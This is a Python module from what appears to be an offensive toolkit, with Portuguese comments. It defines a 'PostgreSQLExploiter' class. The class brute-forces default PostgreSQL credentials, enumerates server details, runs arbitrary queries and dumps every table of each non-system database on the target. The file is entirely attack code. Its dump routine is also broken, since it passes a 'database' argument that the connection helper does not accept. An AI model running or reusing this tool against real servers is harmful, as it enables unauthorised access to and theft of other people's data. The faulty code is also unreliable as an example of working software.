# modules/database/postgresql.py
import psycopg2
import socket
from concurrent.futures import ThreadPoolExecutor

class PostgreSQLExploiter:
    def __init__(self):
        self.common_users = ['postgres', 'admin', 'test', 'user']
        self.common_passwords = [
            '', 'postgres', '123456', 'password', 'admin', '12345',
            'test', 'postgresql'
        ]

    def connect_postgresql(self, target, port=5432, username=None, password=None, timeout=5):
        """Tenta conexão PostgreSQL"""
        try:
            conn = psycopg2.connect(
                host=target,
                port=port,
                user=username,
                password=password,
                connect_timeout=timeout
            )
            return conn
        except:
            return None

    def brute_force_postgresql(self, target, port=5432):
        """Força bruta PostgreSQL"""
        valid_creds = []
        
        for user in self.common_users:
            for password in self.common_passwords:
                conn = self.connect_postgresql(target, port, user, password)
                if conn:
                    valid_creds.append((user, password))
                    print(f"[+] PostgreSQL Credencial: {user}:{password}")
                    
                    # Obtém informações básicas
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT version()")
                        version = cursor.fetchone()[0]
                        print(f"    [+] Versão: {version[:100]}...")
                    except:
                        pass
                    
                    conn.close()
        
        return valid_creds

    def get_postgresql_info(self, target, port, username, password):
        """Obtém informações do PostgreSQL"""
        info = {}
        conn = self.connect_postgresql(target, port, username, password)
        
        if conn:
            try:
                cursor = conn.cursor()
                
                # Informações da instância
                cursor.execute("SELECT version()")
                info['version'] = cursor.fetchone()[0]
                
                # Bancos de dados
                cursor.execute("SELECT datname FROM pg_database")
                info['databases'] = [row[0] for row in cursor.fetchall()]
                
                # Usuários
                cursor.execute("SELECT usename FROM pg_user")
                info['users'] = [row[0] for row in cursor.fetchall()]
                
                # Configurações
                cursor.execute("SHOW ALL")
                info['settings'] = dict(cursor.fetchall())
                
            except Exception as e:
                info['error'] = str(e)
            finally:
                conn.close()
        
        return info

    def execute_command(self, target, port, username, password, query):
        """Executa query PostgreSQL"""
        conn = self.connect_postgresql(target, port, username, password)
        if not conn:
            return None
        
        try:
            cursor = conn.cursor()
            cursor.execute(query)
            
            if cursor.description:  # Se retorna resultados
                result = cursor.fetchall()
            else:
                result = "Query executada com sucesso"
            
            conn.commit()
            conn.close()
            return result
            
        except Exception as e:
            return f"Erro: {str(e)}"

    def dump_database(self, target, port, username, password, database):
        """Faz dump de database específico"""
        conn = self.connect_postgresql(target, port, username, password, database=database)
        if not conn:
            return None
        
        try:
            cursor = conn.cursor()
            
            # Lista tabelas
            cursor.execute("""
                SELECT table_name 
                FROM information_schema.tables 
                WHERE table_schema = 'public'
            """)
            tables = [row[0] for row in cursor.fetchall()]
            
            dump_data = {}
            for table in tables:
                try:
                    cursor.execute(f"SELECT * FROM {table}")
                    rows = cursor.fetchall()
                    dump_data[table] = rows
                except:
                    continue
            
            conn.close()
            return dump_data
            
        except Exception as e:
            return f"Erro: {str(e)}"

    def check_vulnerabilities(self, target, port):
        """Verifica vulnerabilidades comuns do PostgreSQL"""
        vulns = []
        
        # Verifica se permite conexão sem senha
        try:
            conn = self.connect_postgresql(target, port, 'postgres', '')
            if conn:
                vulns.append("Login sem senha permitido")
                conn.close()
        except:
            pass
        
        return vulns

    def scan_postgresql(self, target, port=5432):
        """Scan completo PostgreSQL"""
        print(f"[+] Scan PostgreSQL em: {target}:{port}")
        
        results = {
            'credentials': [],
            'info': {},
            'vulnerabilities': [],
            'databases': []
        }
        
        # Força bruta
        results['credentials'] = self.brute_force_postgresql(target, port)
        
        # Se tiver credenciais, obtém mais informações
        if results['credentials']:
            user, password = results['credentials'][0]
            results['info'] = self.get_postgresql_info(target, port, user, password)
            
            # Verifica vulnerabilidades
            results['vulnerabilities'] = self.check_vulnerabilities(target, port)
            
            # Tenta dump de databases
            if 'databases' in results['info']:
                for db in results['info']['databases']:
                    if db not in ['postgres', 'template0', 'template1']:
                        print(f"    [+] Dump database: {db}")
                        dump = self.dump_database(target, port, user, password, db)
                        if dump and isinstance(dump, dict):
                            results['databases'].append({db: dump})
        
        return results